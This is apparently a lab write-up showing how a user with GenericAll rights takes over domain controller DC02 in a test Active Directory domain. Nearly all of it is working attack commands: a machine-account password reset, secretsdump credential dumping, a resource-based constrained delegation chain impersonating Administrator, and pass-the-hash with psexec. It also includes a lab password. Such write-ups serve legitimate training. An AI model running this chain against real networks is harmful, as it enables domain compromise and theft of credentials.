# GenericAll - user to DC02

With `GenericAll` privilege, the most reliable approach is to **reset the password via LDAP**.

### 1. Password Reset via bloodyAD

```bash
pip3 install bloodyAD

bloodyAD -d 'SUB.POSEIDON.YZX' -u 'JACKIE' -p 'Zetr00712' --host 192.168.121.162 set password 'DC02$' 'Password123!'
```

Then run secretsdump:

```bash
impacket-secretsdump 'SUB.POSEIDON.YZX/DC02$:Password123!@192.168.121.162'
```

[image]

## 2. RBCD to Domain Admin

**Environment Setup:**

```bash
echo "192.168.121.162 DC02.SUB.POSEIDON.YZX DC02" >> /etc/hosts
echo "192.168.121.161 DC01.SUB.POSEIDON.YZX DC01" >> /etc/hosts
ntpdate -u 192.168.121.162
```

**1. Create Machine Account**

```bash
impacket-addcomputer 'SUB.POSEIDON.YZX/jackie:Zetr00712' -computer-name 'ATTACKER$' -computer-pass 'Password123!' -dc-ip 192.168.121.162
```

**2. Get Jackie's TGT (RBCD Write)**

```bash
impacket-getTGT 'SUB.POSEIDON.YZX/jackie:Zetr00712' -dc-ip 192.168.121.162
export KRB5CCNAME=jackie.ccache
```

**3. Write RBCD delegation**

```bash
impacket-rbcd 'SUB.POSEIDON.YZX/jackie' -k -no-pass -delegate-from 'ATTACKER$' -delegate-to 'DC02$' -action write -dc-ip 192.168.121.162
```

**4. Get Service Ticket as Administrator (getST)**

```bash
unset KRB5CCNAME
impacket-getST -spn 'ldap/DC02.SUB.POSEIDON.YZX' -impersonate 'Administrator' 'SUB.POSEIDON.YZX/ATTACKER$:Password123!' -dc-ip 192.168.121.162
```

**5. Dump all hashes (Secretsdump)**

```bash
export KRB5CCNAME=Administrator@cifs_DC02.SUB.POSEIDON.YZX@SUB.POSEIDON.YZX.ccache
impacket-secretsdump -k -no-pass 'SUB.POSEIDON.YZX/Administrator@DC02.SUB.POSEIDON.YZX' -dc-ip 192.168.121.162
```

**6. Pass-the-Hash**

```bash
impacket-psexec -hashes :<ADMIN_NTLM_HASH> 'SUB.POSEIDON.YZX/Administrator@192.168.121.161'
```
